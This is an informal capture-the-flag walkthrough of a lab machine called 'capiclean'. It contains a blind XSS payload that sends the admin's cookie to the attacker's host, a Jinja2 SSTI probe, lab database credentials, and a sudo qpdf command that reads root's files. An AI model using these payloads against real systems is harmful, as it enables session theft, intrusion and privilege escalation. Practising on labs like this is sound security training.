Started with a nmap scan
```
22 OpenSSH 8.9p1
80 Apache 2.4.52 and werzeug 2.3.7 python/3.10.12
```
Going to the website it has a domain that nmap did not pickup on `http://capiclean.htb` so now we can see the website there is a login forum and a place to get quotes and that's it the quote is vulnerable to blind xss but not in the email pram in the `service` pram so we can steal cookies because its looked at by there admin team so if we use this payload `<img src=x onerror=fetch('http://10.10.16.4:81/?c='+document.cookie');>` and standup are python web server and we got the cookie `session=cookie` and we put this cookie in are web browser and now we have access to the site if we go to the `/dashboard` and we get some more pages and we can generate somethings we know the webserver has python on it so we need to test for SSTI took a little bit but first we need to generate the invoice and then we need to make a QR code for it and then input the invoice number in the `qr_link` and this is the part that is vulnerable to SSTI if we put `{{7*7}}` and we get `49` on it in the `img` tag so its running `jinja2` testing some payloads one I used to bypass WAF worked and we got `www-data` back we can use metasploit to get a reverse shell and then looking at the `app.py` we get database creds `iclean:pxCsmnGLckUb` and we can login into the database now and dump the creds from the users table and we got 2 users hash and its hashed in `sha2-256` and we cracked `consuela` hash to `simple and clean` now we can SSH into the host so we can get a better shell and when we run `sudo -l` we have sudo priv on a binary `/usr/bin/qpdf` to exploit this and get the root flag we can do this `sudo /usr/bin/qpdf --qdf --add-attachment /root/root.txt -- --empty ./root.txt` and then we can `cat root.txt` and now we have the flag  